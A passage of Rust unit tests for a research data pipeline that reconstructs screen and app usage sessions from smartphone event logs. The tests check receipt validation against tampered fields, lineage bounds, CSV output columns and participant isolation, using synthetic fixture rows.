        let expected_options_origin = baseline.b05_schoedel_preflight.options_digest_origin;
        let receipt = validated_b05_schoedel_receipt(
            &baseline,
            &options,
            &raw_digest,
            &expected_options_digest,
            expected_options_origin,
        )
        .expect("live result returns validated receipt");
        assert_eq!(
            receipt.status,
            B05SchoedelValidationStatus::ScreenAndSchoedelValidated
        );
        let receipt_json = serde_json::to_string(&receipt).unwrap();
        assert!(!receipt_json.contains("P01"));
        let forbidden_stable_participant_scope_digest = sha256_jcs(
            &serde_json::json!({
                "domain": "chronicle-schoedel-decisive-participant-scope/v1",
                "participantIds": ["P01"],
            }),
            "test forbidden deterministic participant scope",
        )
        .unwrap();
        assert!(!receipt_json.contains(&forbidden_stable_participant_scope_digest));
        assert_eq!(
            receipt.finalized_preflight_jcs_digest,
            sha256_jcs(&baseline.b05_schoedel_preflight, "test finalized preflight").unwrap()
        );

        for field in [
            "protocol",
            "router",
            "screen_component",
            "schoedel_component",
            "options_digest",
            "options_origin",
            "episode_id",
            "screen_options",
            "lineage_count",
        ] {
            let mut tampered = baseline.clone();
            match field {
                "protocol" => {
                    tampered.b05_schoedel_preflight.protocol_version = "tampered/v1".into()
                }
                "router" => {
                    tampered.b05_schoedel_preflight.component_options_digest = sha256_wire(b"x")
                }
                "screen_component" => {
                    tampered
                        .b05_schoedel_preflight
                        .screen_component_options_digest = sha256_wire(b"x")
                }
                "schoedel_component" => {
                    tampered
                        .b05_schoedel_preflight
                        .schoedel_component_options_digest = sha256_wire(b"x")
                }
                "options_digest" => {
                    tampered.b05_schoedel_preflight.options_digest = sha256_wire(b"foreign")
                }
                "options_origin" => {
                    tampered.b05_schoedel_preflight.options_digest_origin =
                        B05OptionsDigestOrigin::VerifiedRequestJcs
                }
                "episode_id" => {
                    tampered
                        .b05_schoedel_preflight
                        .requested_episode_strategy_id = "foreign_episode".into()
                }
                "screen_options" => {
                    let screen = tampered
                        .b05_schoedel_preflight
                        .screen_construction
                        .as_mut()
                        .unwrap();
                    *screen = b05::rebind_screen_construction_options_digest(
                        screen,
                        &sha256_wire(b"foreign screen options"),
                    );
                }
                "lineage_count" => {
                    tampered.row_lineage = Arc::new((*tampered.row_lineage).clone());
                    Arc::make_mut(&mut tampered.row_lineage)[0].source_data_row_count += 1;
                }
                _ => unreachable!(),
            }
            assert!(
                validated_b05_schoedel_receipt(
                    &tampered,
                    &options,
                    &raw_digest,
                    &expected_options_digest,
                    expected_options_origin,
                )
                .is_err(),
                "accepted one-field tamper {field}",
            );
        }

        assert!(validated_b05_schoedel_receipt(
            &baseline,
            &options,
            &raw_digest,
            &sha256_wire(b"foreign but valid options digest"),
            expected_options_origin,
        )
        .is_err());

        let mut foundational_tamper = baseline.clone();
        foundational_tamper
            .foundational_semantics_evidence
            .minimum_duration
            .qualifying_count += 1;
        assert!(validated_b05_schoedel_receipt(
            &foundational_tamper,
            &options,
            &raw_digest,
            &expected_options_digest,
            expected_options_origin,
        )
        .is_err());

        let mut coherently_rehashed = baseline.clone();
        let removed = coherently_rehashed
            .foundational_semantics_evidence
            .minimum_duration_excluded_episodes
            .pop()
            .expect("baseline includes minimum-duration exclusion lineage");
        let minimum = &mut coherently_rehashed
            .foundational_semantics_evidence
            .minimum_duration;
        minimum.qualifying_count -= 1;
        minimum.retained_excluded_count -= 1;
        minimum.retained_credited_count += 1;
        minimum.excluded_lineage_digest = sha256_wire(
            &serde_json::to_vec(
                &coherently_rehashed
                    .foundational_semantics_evidence
                    .minimum_duration_excluded_episodes,
            )
            .unwrap(),
        );
        assert!(
            validate_foundational_semantics_evidence_for_options(
                &coherently_rehashed.foundational_semantics_evidence,
                &options,
            )
            .is_ok(),
            "coherent alternate evidence remains shape-valid"
        );
        assert!(
            validated_b05_schoedel_receipt(
                &coherently_rehashed,
                &options,
                &raw_digest,
                &expected_options_digest,
                expected_options_origin,
            )
            .is_err(),
            "producer-bound foundational digest rejects coherent alternate counts/lineage"
        );
        drop(removed);

        let encoded = serde_json::to_vec(&baseline).unwrap();
        let round_tripped: PipelineV2Result = serde_json::from_slice(&encoded).unwrap();
        assert_eq!(
            validated_b05_schoedel_receipt(
                &round_tripped,
                &options,
                &raw_digest,
                &expected_options_digest,
                expected_options_origin,
            ),
            Err("b05_schoedel_validation_error:unvalidated_result_sentinel".into()),
        );
    }

    #[test]
    fn standalone_validation_receipt_rejects_coherently_rehashed_out_of_bounds_lineage() {
        let options = schoedel_options();
        let baseline = run_pipeline_v2_with_supports(
            SCHOEDEL_PIPELINE_RAW,
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("B04 lineage baseline");
        let mut evidence = baseline.foundational_semantics_evidence.clone();
        let decoded_bound = baseline
            .b05_schoedel_validation_context
            .receipt
            .decoded_input_row_count as u32;
        evidence.minimum_duration_excluded_episodes[0].source_data_row_ranges[0].last =
            decoded_bound + 1;
        evidence.minimum_duration.excluded_lineage_digest =
            sha256_wire(&serde_json::to_vec(&evidence.minimum_duration_excluded_episodes).unwrap());
        let mut receipt = baseline.b05_schoedel_validation_context.receipt.clone();
        receipt.foundational_semantics_evidence_jcs_digest =
            sha256_jcs(&evidence, "tampered B04 evidence").unwrap();
        receipt.validation_digest = b05_schoedel_validation_digest(&receipt).unwrap();
        assert!(validate_b05_schoedel_validation_receipt_integrity(
            &receipt,
            &baseline.b05_schoedel_preflight,
            &evidence,
            &options,
        )
        .is_err());

        let zero_raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Target Child,App A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Target Child,App A,Activity Paused,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:00:02,UTC\n",
        );
        let mut zero_options = test_options();
        zero_options.correct_duplicate_event_timestamps = false;
        zero_options.minimum_usage_duration = 0.0;
        zero_options.minimum_duration_disposition = MinimumDurationDisposition::RetainAndCredit;
        zero_options.filter_zero_duration_sessions = true;
        let zero = run_pipeline_v2_with_supports(
            zero_raw.as_bytes(),
            &zero_options,
            PipelineV2SupportFiles::default(),
        )
        .expect("zero cleanup lineage baseline");
        let mut evidence = zero.foundational_semantics_evidence.clone();
        assert!(!evidence.zero_duration_cleanup.removed_rows.is_empty());
        let decoded_bound = zero
            .b05_schoedel_validation_context
            .receipt
            .decoded_input_row_count as u32;
        evidence.zero_duration_cleanup.removed_rows[0].source_data_row_ranges[0].last =
            decoded_bound + 1;
        evidence
            .zero_duration_cleanup
            .receipt
            .removed_lineage_digest =
            sha256_wire(&serde_json::to_vec(&evidence.zero_duration_cleanup.removed_rows).unwrap());
        let mut receipt = zero.b05_schoedel_validation_context.receipt.clone();
        receipt.foundational_semantics_evidence_jcs_digest =
            sha256_jcs(&evidence, "tampered zero cleanup evidence").unwrap();
        receipt.validation_digest = b05_schoedel_validation_digest(&receipt).unwrap();
        assert!(validate_b05_schoedel_validation_receipt_integrity(
            &receipt,
            &zero.b05_schoedel_preflight,
            &evidence,
            &zero_options,
        )
        .is_err());
    }

    #[test]
    fn source_b05_screen_csv_exposes_complete_interval_lineage() {
        let options = source_screen_options();
        let sidecar = b05_capable_sidecar(
            B05_IDENTITY_TEST_RAW,
            options.screen_session_construction_strategy,
        );
        let result = run_pipeline_v2_with_supports(
            B05_IDENTITY_TEST_RAW,
            &options,
            PipelineV2SupportFiles {
                input_capability_evidence_csv: &sidecar,
                ..PipelineV2SupportFiles::default()
            },
        )
        .expect("source B05 screen run");
        let csv = String::from_utf8(result.screen_csv_bytes.to_vec()).unwrap();
        let header = csv.lines().next().unwrap();
        for column in [
            "screen_interval_id",
            "screen_session_construction_strategy",
            "screen_interval_kind",
            "screen_start_boundary_source_row",
            "screen_stop_boundary_source_row",
            "screen_start_source_rows",
            "screen_stop_source_rows",
            "screen_interval_close_reason",
            "screen_interval_left_censored",
            "screen_interval_right_censored",
        ] {
            assert!(
                header.split(',').any(|candidate| candidate == column),
                "{column}"
            );
        }
        let screen = result.b05_schoedel_preflight.screen_construction.unwrap();
        assert_eq!(
            result.b05_schoedel_preflight.screen_construction_phase,
            B05ComputationPhase::Finalized
        );
        assert_eq!(
            screen.applicability.input_digest,
            sha256_wire(B05_IDENTITY_TEST_RAW)
        );
        assert!(screen
            .intervals
            .iter()
            .all(|interval| csv.contains(&interval.screen_interval_id)));
        let header_columns = header.split(',').map(str::to_owned).collect::<Vec<_>>();
        assert_eq!(
            header_columns,
            declared_screen_output_columns_for_strategy(
                options.screen_session_construction_strategy
            )
        );
        let timezone_index = header_columns
            .iter()
            .position(|column| column == "timezone")
            .expect("timezone column");
        let first_row = csv.lines().nth(1).expect("one screen interval");
        assert_eq!(
            first_row.split(',').nth(timezone_index),
            Some("America/Chicago"),
            "source-B05 rows use the selected output timezone",
        );
        assert!(result.row_lineage.iter().all(|lineage| {
            lineage.output_kind.as_str() != "screen-csv"
                || (lineage.screen_interval_id().is_some()
                    && lineage.screen_construction_strategy_id()
                        == Some("parry_toth_2025_session_glance_v1")
                    && lineage.screen_interval_kind().is_some()
                    && lineage.screen_interval_close_reason().is_some())
        }));
        let review = String::from_utf8(result.review_summary_json_bytes.to_vec()).unwrap();
        let visualization =
            String::from_utf8(result.visualization_data_json_bytes.to_vec()).unwrap();
        assert!(visualization.contains("\"protocolVersion\":\"chronicle-visualization-data/v3\""));
        for projection in [&review, &visualization] {
            assert!(projection.contains("foundationalProvenance"));
            assert!(screen
                .intervals
                .iter()
                .all(|interval| projection.contains(&interval.screen_interval_id)));
        }
    }

    #[test]
    fn source_b05_maximum_duration_exclusion_keeps_policy_neutral_provenance() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Target Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Target Child,,Keyguard Shown,android,2026-03-07 11:01:00,UTC\n",
            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 11:01:01,UTC\n",
            "Study,P02,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P02,Target Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
            "Study,P02,Target Child,,Keyguard Shown,android,2026-03-07 10:00:29,UTC\n",
            "Study,P02,Target Child,,Screen Non-Interactive,android,2026-03-07 10:00:30,UTC\n",
        )
        .as_bytes();
        let mut options = source_screen_options();
        options.screen_session_maximum_duration_minutes = 60.0;
        options.screen_session_maximum_duration_disposition =
            ScreenSessionMaximumDurationDisposition::ExcludeParticipant;
        let sidecar = b05_capable_sidecar_for_participants(
            raw,
            options.screen_session_construction_strategy,
            &["P01", "P02"],
        );
        let result = run_pipeline_v2_with_supports(
            raw,
            &options,
            PipelineV2SupportFiles {
                input_capability_evidence_csv: &sidecar,
                ..PipelineV2SupportFiles::default()
            },
        )
        .expect("source B05 participant exclusion");
        assert_eq!(result.processed_row_count, 4);
        #[cfg(feature = "incremental-v2")]
        {
            let mut engine = IncrementalPipelineV2Engine::default();
            let tracked = engine
                .execute(
                    raw,
                    &options,
                    PipelineV2SupportFiles {
                        input_capability_evidence_csv: &sidecar,
                        ..PipelineV2SupportFiles::default()
                    },
                )
                .expect("tracked source B05 participant exclusion");
            assert_eq!(
                tracked.result.processed_row_count,
                result.processed_row_count
            );
            assert_eq!(tracked.result.app_csv_bytes, result.app_csv_bytes);
            assert_eq!(tracked.result.screen_csv_bytes, result.screen_csv_bytes);
        }

        let screen = result
            .b05_schoedel_preflight
            .screen_construction
            .as_ref()
            .expect("policy-neutral B05 construction");
        assert_eq!(screen.intervals.len(), 2);
        assert_eq!(result.screen_row_count, 1);
        let retained = screen
            .intervals
            .iter()
            .find(|interval| interval.participant_id == "P02")
            .expect("retained interval");
        let excluded = screen
            .intervals
            .iter()
            .find(|interval| interval.participant_id == "P01")
            .expect("excluded interval");
        let csv = String::from_utf8(result.screen_csv_bytes.into_vec().unwrap()).unwrap();
        assert!(csv.contains(&retained.screen_interval_id));
        assert!(!csv.contains(&excluded.screen_interval_id));
        let screen_lineage = result
            .row_lineage
            .iter()
            .filter(|lineage| lineage.output_kind.as_str() == "screen-csv")
            .collect::<Vec<_>>();
        assert_eq!(screen_lineage.len(), 1);
        assert_eq!(
            screen_lineage[0].screen_interval_id(),
            Some(retained.screen_interval_id.as_str())
        );
        let review = String::from_utf8(result.review_summary_json_bytes.into_vec().unwrap()).unwrap();
        assert!(review.contains(&retained.screen_interval_id));
        assert!(review.contains(&excluded.screen_interval_id));
    }

    #[test]
    fn default_screen_selection_keeps_product_bytes_but_records_relation() {
        let mut omitted = test_options();
        omitted.usage_session_mode = UsageSessionMode::ScreenUsage;
        omitted.include_app_output = false;
        omitted.include_screen_output = true;
        let mut explicit = omitted.clone();
        explicit.screen_session_construction_strategy_explicit = true;

        let omitted_result = run_pipeline_v2_with_supports(
            B05_IDENTITY_TEST_RAW,
            &omitted,
            PipelineV2SupportFiles::default(),
        )
        .expect("omitted Chronicle baseline");
        let explicit_result = run_pipeline_v2_with_supports(
            B05_IDENTITY_TEST_RAW,
            &explicit,
            PipelineV2SupportFiles::default(),
        )
        .expect("explicit Chronicle baseline");
        assert_eq!(
            omitted_result.screen_csv_bytes,
            explicit_result.screen_csv_bytes
        );
        assert_eq!(
            omitted_result.review_summary_json_bytes,
            explicit_result.review_summary_json_bytes,
        );
        assert_eq!(
            omitted_result.visualization_data_json_bytes,
            explicit_result.visualization_data_json_bytes,
        );
        assert!(
            String::from_utf8(omitted_result.visualization_data_json_bytes.to_vec())
                .unwrap()
                .contains("\"protocolVersion\":\"chronicle-visualization-data/v2\"")
        );
        assert_eq!(
            omitted_result
                .b05_schoedel_preflight
                .screen_construction
                .as_ref()
                .unwrap()
                .applicability
                .relation,
            b05::ScientificRelation::BaselineNative,
        );
        assert_eq!(
            explicit_result
                .b05_schoedel_preflight
                .screen_construction
                .as_ref()
                .unwrap()
                .applicability
                .relation,
            b05::ScientificRelation::BaselineEquivalent,
        );
    }

    #[test]
    fn finalized_chronicle_receipt_commits_exact_physical_csv_bytes() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:01:00,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:01:00,UTC\n",
        )
        .as_bytes();
        let mut options = test_options();
        options.usage_session_mode = UsageSessionMode::ScreenUsage;
        options.include_app_output = false;
        options.include_screen_output = true;
        let result =
            run_pipeline_v2_with_supports(raw, &options, PipelineV2SupportFiles::default())
                .expect("Chronicle baseline");
        assert_eq!(
            result
                .b05_schoedel_preflight
                .screen_construction
                .unwrap()
                .applicability
                .input_digest,
            sha256_wire(raw),
        );
    }

    #[test]
    fn schoedel_right_censor_is_unbounded_evidence_without_headline_credit() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,A,Activity Paused,app.a,2026-03-07 10:00:09,UTC\n",
        )
        .as_bytes();
        let mut options = schoedel_options();
        options.include_app_usage_end_reason = true;
        options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
        options.micro_use_classification_policy_explicit = true;
        options.minimum_usage_duration = 5.0;
        options.minimum_usage_duration_explicit = true;
        let result =
            run_pipeline_v2_with_supports(raw, &options, PipelineV2SupportFiles::default())
                .expect("right-censored evidence run");
        let reconstruction = result
            .b05_schoedel_preflight
            .schoedel_reconstruction
            .as_ref()
            .unwrap();
        assert_eq!(reconstruction.episodes.len(), 1);
        let episode = &reconstruction.episodes[0];
        assert_eq!(
            episode.completion,
            b05::SchoedelCompletion::RightCensoredScreenInterval
        );
        assert_eq!((episode.stop_ns, episode.raw_duration_ns), (None, None));
        assert!(!episode.bounded_headline_candidate);
        assert_eq!(result.app_row_count, 1);
        assert_eq!(
            result
                .foundational_semantics_evidence
                .micro_use
                .class_counts,
            BTreeMap::from([("not_classifiable".into(), 1)]),
        );
        assert_eq!(
            result
                .foundational_semantics_evidence
                .minimum_duration
                .unbounded_episode_count,
            1
        );
        assert_eq!(
            result
                .foundational_semantics_evidence
                .minimum_duration
                .qualifying_count,
            0,
        );
        let csv = String::from_utf8(result.app_csv_bytes.to_vec()).unwrap();
        assert!(csv.contains("End of Usage Missing"));
        assert!(csv.contains("right_censored_screen_interval"));
        let mut lines = csv.lines();
        let header = lines
            .next()
            .expect("right-censored Schoedel CSV header")
            .split(',')
            .collect::<Vec<_>>();
        let completion_index = header
            .iter()
            .position(|column| *column == "schoedel_completion")
            .expect("Schoedel completion column");
        let end_reason_index = header
            .iter()
            .position(|column| *column == "app_usage_end_reason")
            .expect("app end-reason column");
        let micro_index = header
            .iter()
            .position(|column| *column == "micro_use_classification")
            .expect("B03 classification column");
        let right_censored = lines
            .map(|line| line.split(',').collect::<Vec<_>>())
            .find(|fields| {
                fields.get(completion_index).copied() == Some("right_censored_screen_interval")
            })
            .expect("right-censored evidence row");
        assert_eq!(
            right_censored.get(end_reason_index).copied(),
            Some("right_censored_screen_interval"),
        );
        assert_eq!(
            right_censored.get(micro_index).copied(),
            Some("not_classifiable"),
        );
        let review: serde_json::Value =
            serde_json::from_slice(&result.review_summary_json_bytes.to_vec()).unwrap();
        assert!(review["participants"]
            .as_array()
            .expect("review participants")
            .iter()
            .all(|participant| participant["totals"]["appSessionCount"] == 0));
        assert_eq!(
            review["microUseReceipt"],
            serde_json::to_value(&result.foundational_semantics_evidence.micro_use).unwrap(),
        );
        assert!(result.row_lineage.iter().any(|lineage| {
            lineage.schoedel_completion() == Some("right_censored_screen_interval")
        }));
    }

    #[test]
    fn schoedel_reads_b01_retained_app_stream_but_b05_keeps_raw_screen_stream() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,A,User Interaction,app.a,2026-03-07 10:00:04,UTC\n",
            "Study,P01,Child,B,Activity Resumed,app.b,2026-03-07 10:00:05,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:08,UTC\n",
        )
        .as_bytes();
        let none = run_pipeline_v2_with_supports(
            raw,
            &schoedel_options(),
            PipelineV2SupportFiles::default(),
        )
        .expect("unfiltered app evidence");
        let mut foreground_only = schoedel_options();
        foreground_only.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
        let retained =
            run_pipeline_v2_with_supports(raw, &foreground_only, PipelineV2SupportFiles::default())
                .expect("B01-filtered app evidence");
        let none_episodes = &none
            .b05_schoedel_preflight
            .schoedel_reconstruction
            .as_ref()
            .unwrap()
            .episodes;
        let retained_episodes = &retained
            .b05_schoedel_preflight
            .schoedel_reconstruction
            .as_ref()
            .unwrap()
            .episodes;
        assert_eq!(none_episodes[0].stop_source_row, Some(3));
        assert_eq!(retained_episodes[0].stop_source_row, Some(2));
        assert_eq!(
            none_episodes[0].screen_interval_id, retained_episodes[0].screen_interval_id,
            "B01 must not alter the raw B05 screen interval",
        );
    }

    #[test]
    fn schoedel_strategy_defined_opener_is_type_one_and_gesis_is_controlled_derivative() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,A,Standby Bucket Changed,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,A,Activity Paused,app.a,2026-03-07 10:00:02,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:03,UTC\n",
        )
        .as_bytes();
        let native = run_pipeline_v2_with_supports(
            raw,
            &schoedel_options(),
            PipelineV2SupportFiles::default(),
        )
        .expect("native type-one opener set");
        assert!(native
            .b05_schoedel_preflight
            .schoedel_reconstruction
            .as_ref()
            .unwrap()
            .episodes
            .is_empty());

        let mut gesis = schoedel_options();
        gesis.opener_set = OpenerSet::GesisAppScopedStarts;
        let derivative =
            run_pipeline_v2_with_supports(raw, &gesis, PipelineV2SupportFiles::default())
                .expect("explicit GESIS opener derivative");
        assert_eq!(
            derivative
                .b05_schoedel_preflight
                .schoedel_reconstruction
                .as_ref()
                .unwrap()
                .episodes
                .len(),
            1,
        );
        assert_eq!(
            derivative.opener_set_evidence.applicability.relation,
            OpenerStrategyRelation::ControlledDerivative,
        );
    }

    #[test]
    fn schoedel_uses_raw_equal_time_membership_despite_canonical_correction() {
        let make_raw = |app_before_stop: bool| {
            let middle = if app_before_stop {
                concat!(
                    "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
                    "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:01,UTC\n",
                )
            } else {
                concat!(
                    "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:01,UTC\n",
                    "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
                )
            };
            format!(
                "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\nStudy,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n{middle}"
            )
            .into_bytes()
        };
        for correction in [false, true] {
            for (app_before_stop, expected_episodes) in [(true, 1), (false, 0)] {
                let raw = make_raw(app_before_stop);
                let mut options = schoedel_options();
                options.correct_duplicate_event_timestamps = correction;
                options.screen_session_construction_strategy =
                    ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
                options.screen_session_construction_strategy_explicit = true;
                let sidecar =
                    b05_capable_sidecar(&raw, options.screen_session_construction_strategy);
                let result = run_pipeline_v2_with_supports(
                    &raw,
                    &options,
                    PipelineV2SupportFiles {
                        input_capability_evidence_csv: &sidecar,
                        ..PipelineV2SupportFiles::default()
                    },
                )
                .expect("source B05 Schoedel crossing");
                assert_eq!(
                    result
                        .b05_schoedel_preflight
                        .schoedel_reconstruction
                        .as_ref()
                        .unwrap()
                        .episodes
                        .len(),
                    expected_episodes,
                    "correction={correction} app_before_stop={app_before_stop}",
                );
                #[cfg(feature = "incremental-v2")]
                {
                    let mut engine = IncrementalPipelineV2Engine::default();
                    let tracked = engine
                        .execute(
                            &raw,
                            &options,
                            PipelineV2SupportFiles {
                                input_capability_evidence_csv: &sidecar,
                                ..PipelineV2SupportFiles::default()
                            },
                        )
                        .expect("tracked source B05 Schoedel crossing");
                    assert_eq!(
                        tracked.result.b05_schoedel_preflight,
                        result.b05_schoedel_preflight
                    );
                    assert_eq!(tracked.result.app_csv_bytes, result.app_csv_bytes);
                    assert_eq!(tracked.result.row_lineage, result.row_lineage);

                    let unknown_sidecar = String::from_utf8(sidecar.clone()).unwrap().replace(
                        "equal_timestamp_source_order_preserved,capable,study_protocol,fixture,",
                        "equal_timestamp_source_order_preserved,unknown,unspecified,,",
                    );
                    let unknown_support = PipelineV2SupportFiles {
                        input_capability_evidence_csv: unknown_sidecar.as_bytes(),
                        ..PipelineV2SupportFiles::default()
                    };
                    let refused = engine
                        .preflight_b05_schoedel(&raw, &options, unknown_support)
                        .expect("unknown raw source-order evidence is a typed refusal");
                    assert_eq!(
                        refused
                            .schoedel_reconstruction
                            .as_ref()
                            .unwrap()
                            .applicability
                            .refusal_reason,
                        Some(b05::SchoedelRefusalReason::AmbiguousEqualTimestamp),
                        "correction={correction} app_before_stop={app_before_stop}",
                    );
                }
            }
        }
    }

    #[test]
    fn schoedel_deduplicates_logical_opener_once_but_keeps_physical_lineage() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,A,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,A,Activity Paused,app.a,2026-03-07 10:00:02,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:03,UTC\n",
        )
        .as_bytes();
        let result = run_pipeline_v2_with_supports(
            raw,
            &schoedel_options(),
            PipelineV2SupportFiles::default(),
        )
        .expect("deduplicated Schoedel episode");
        let episodes = &result
            .b05_schoedel_preflight
            .schoedel_reconstruction
            .as_ref()
            .unwrap()
            .episodes;
        assert_eq!(episodes.len(), 1);
        assert_eq!(episodes[0].source_rows, vec![2, 3, 4]);
        assert_eq!(result.exact_duplicate_rows_removed, 1);
    }

    #[test]
    fn all_screen_strategy_headers_match_their_declared_contract() {
        for strategy in ScreenSessionConstructionStrategyId::ALL {
            let mut options = source_screen_options();
            options.screen_session_construction_strategy = strategy;
            options.screen_session_construction_strategy_explicit =
                strategy != ScreenSessionConstructionStrategyId::ChronicleScreenInteractiveV1;
            let sidecar = b05_capable_sidecar(B05_IDENTITY_TEST_RAW, strategy);
            let result = run_pipeline_v2_with_supports(
                B05_IDENTITY_TEST_RAW,
                &options,
                PipelineV2SupportFiles {
                    input_capability_evidence_csv: &sidecar,
                    ..PipelineV2SupportFiles::default()
                },
            )
            .expect("screen strategy output");
            let csv = String::from_utf8(result.screen_csv_bytes.to_vec()).unwrap();
            assert_eq!(
                csv.lines()
                    .next()
                    .unwrap()
                    .split(',')
                    .map(str::to_owned)
                    .collect::<Vec<_>>(),
                declared_screen_output_columns_for_strategy(strategy),
                "{}",
                strategy.canonical_id(),
            );
        }
    }

    #[test]
    fn chronicle_screen_receipt_preserves_participant_isolation_orphans_and_empty_input() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 09:59:00,UTC\n",
            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P02,Child,,Screen Interactive,android,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:02,UTC\n",
            "Study,P02,Child,,Screen Non-Interactive,android,2026-03-07 10:00:03,UTC\n",
        )
        .as_bytes();
        let mut options = test_options();
        options.usage_session_mode = UsageSessionMode::ScreenUsage;
        options.include_app_output = false;
        options.include_screen_output = true;
        let result =
            run_pipeline_v2_with_supports(raw, &options, PipelineV2SupportFiles::default())
                .expect("participant-partitioned Chronicle screen run");
        let screen = result.b05_schoedel_preflight.screen_construction.unwrap();
        assert_eq!(
            screen
                .intervals
                .iter()
                .map(|interval| (
                    interval.participant_id.as_str(),
                    interval.start_ns,
                    interval.stop_ns,
                ))
                .collect::<Vec<_>>(),
            vec![
                (
                    "P01",
                    1_772_877_600_000_000_000,
                    Some(1_772_877_602_000_000_000),
                ),
                (
                    "P02",
                    1_772_877_601_000_000_000,
                    Some(1_772_877_603_000_000_000),
                ),
            ],
        );
        assert_eq!(
            screen
                .construction_receipt
                .as_ref()
                .unwrap()
                .issue_counts
                .get("chronicle_orphan_stop"),
            Some(&1),
        );
        assert_eq!(screen.issues[0].source_data_row, 1);

        let header_only = b"study_id,participant_id,interaction_type,event_timestamp\n";
        let empty =
            run_pipeline_v2_with_supports(header_only, &options, PipelineV2SupportFiles::default())
                .expect("empty Chronicle screen run");
        let receipt = empty
            .b05_schoedel_preflight
            .screen_construction
            .unwrap()
            .construction_receipt
            .unwrap();
        assert_eq!((receipt.participant_count, receipt.interval_count), (0, 0));
    }

    #[test]
    fn canonical_participant_state_isolation_matches_independent_runs() {
        let p1 = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive/Keyguard Shown,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:03:20,UTC\n",
        );
        let combined = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,,Screen Interactive/Keyguard Shown,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
            "Study,P02,Child,,Keyguard Shown,com.amazon.firelauncher,2026-03-07 10:03:15,UTC\n",
            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:03:20,UTC\n",
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.usage_session_mode = UsageSessionMode::ScreenUsage;
        options.include_app_output = false;
        options.include_screen_output = true;
        options.screen_auto_lock_timeout_seconds = 120.0;
        options.screen_auto_lock_tolerance_seconds = 30.0;
        options.screen_manual_lock_max_tail_seconds = 5.0;
        options.screen_keyguard_near_stop_seconds = 10.0;
        let isolated = run_pipeline_v2_with_supports(
            p1.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("P01-only run");
        let interleaved = run_pipeline_v2_with_supports(
            combined.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("interleaved run");
        assert_eq!(isolated.screen_csv_bytes, interleaved.screen_csv_bytes);
